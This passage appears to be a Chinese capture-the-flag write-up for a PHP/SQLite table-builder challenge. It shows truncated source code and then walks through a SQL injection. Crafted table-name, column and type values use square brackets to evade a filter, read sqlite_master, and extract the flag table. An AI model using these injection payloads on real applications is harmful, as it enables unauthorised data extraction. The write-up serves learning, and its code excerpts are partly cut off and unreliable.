    query("SELECT name FROM sqlite_master WHERE type='table' AND name <> '" . tableName . "' LIMIT 1;");
      $tName = $stmt->fetch(PDO::FETCH_ASSOC)['name'];
      $stmt = $pdo->query("PRAGMA table_info(`{$tName}`);");
      $cName = $stmt->fetchAll(PDO::FETCH_ASSOC);
    }
    if ($page === 'modify' && $method === 'POST') {
      $values = $_POST['values'];
      $stmt = $pdo->prepare("INSERT INTO `{$tName}` VALUES (?" . str_repeat(',?', count($cName) - 1) . ")");
      $stmt->execute($values);
      redirect('?page=index');
    }
    if ($page === 'build' && $method === 'POST' && !isset($_SESSION['database'])) {
      if (!isset($_POST['table_name']) || !isset($_POST['columns'])) {
        flash('Parameters missing.');
      }
      $tName = (string) $_POST['table_name'];
      $ccc = $_POST['columns'];
      $filename = bin2hex(random_bytes(16)) . '.db';
      $pdo = new PDO('sqlite:db/' . $filename);
      if (!filter($tName)) {
        flash('表不合法');
      }
      if (strlen($tName) query('CREATE TABLE `' . tableName . '` (`' . columnName . '` TEXT);');
      $pdo->query('INSERT INTO `' . tableName . '` VALUES ("' . ans . '");');
      $pdo->query($sql);
      $_SESSION['database'] = $filename;
      redirect('?page=index');
    }
    if ($page === 'remove') {
      $_SESSION = array();
      session_destroy();
      redirect('?page=index');
    }
    if ($page === 'index' && isset($_SESSION['database'])) {
      $stmt = $pdo->query("SELECT * FROM `{$tName}`;");
      if ($stmt === FALSE) {
        $_SESSION = array();
        session_destroy();
        redirect('?page=index');
      }
      $result = $stmt->fetchAll(PDO::FETCH_NUM);
    }
    ?>
        SQLManager
        SQLManager
        信息 
         (删表)
        建表
            表名 
            列数 
            Next
                Name
                Type
                example1
                TEXT
                example2
                TEXT
        $('#next').on('click', () => {
          let num = parseInt($('#num').val(), 10);
          let len = $('#table_name').val().length;
          if (4 
                    INTEGER
                    REAL
                    TEXT
              `));
            }
          }
          return false;
        });
有了源码，逻辑就清晰了许多，源码中有flag表创建和插入flag的操作，可以确定flag存在于数据库中，但是对于表名和flag值都是在开始包含进来的config.php里定义的。
在源码中的创建表相关代码可以发现，创建表时表名，列名，列类型可能存在SQL注入：
    $sql = "CREATE TABLE {$tName} (";
      $sql .= "example1 TEXT, example2 TEXT";
      for ($i = 0; $i query('CREATE TABLE `' . tableName . '` (`' . columnName . '` TEXT);');
      $pdo->query('INSERT INTO `' . tableName . '` VALUES ("' . ans . '");');
      $pdo->query($sql);
看一下最终拼接后的sql语句：
    CREATE TABLE {$tName} (example1 TEXT, example2 TEXT, `$column` $type);
>
> sqlite_master表是SQLite的系统表。该表记录该数据库中保存的表、索引、视图、和触发器信息。每一行记录一个项目。在创建一个SQLIte数据库的时候，该表会自动创建。sqlite_master表包含5列。
>
>   * type列记录了项目的类型，如table、index、view、trigger。
>
>   * name列记录了项目的名称，如表名、索引名等。
>
>   * tbl_name列记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身。
>
>   * rootpage列记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL。
>
>   * sql列记录创建该项目的SQL语句。
>
>
>
>
> 
那我们只有只要想办法查sqlite_master表就知道flag表和对应的字段名。结合上面的sql语句，我们可以使用这种方式：
    create table aa as select xxx from xxx
同时参数还经过了filter函数的处理，被检测到就显示表名非法。
那么通过表名，列名和类型三个地方传入payload，来拼接出我们想要执行的语句。
但是发现在tbname后还拼接了一些内容会造成干扰，这里可以通过 反引号 把它包裹起来，因为包裹起来的内容就成为了关键字，就相
于 `select xx as key`,看一下这个例子：
同时反引号可以使用`[]`来替代绕过过滤。
payload1:
    在创建表时，表名: t AS SELECT sql [
    列名: abc
    列类型: ] FROM sqlite_master;
这时的sql语句就是：
    CREATE TABLE t AS SELECT sql [ (example1 TEXT, example2 TEXT, abc ] FROM sqlite_master;);
等价于
    CREATE TABLE t AS SELECT sql FROM sqlite_master;
得到了表名和列名，替换语句中的sql和sqlite_master 即可获得flag：
payload2:
    t AS SELECT flag_ThE_C0lumn [
    abc
    ]FROM flag_Y0U_c4nt_GUESS;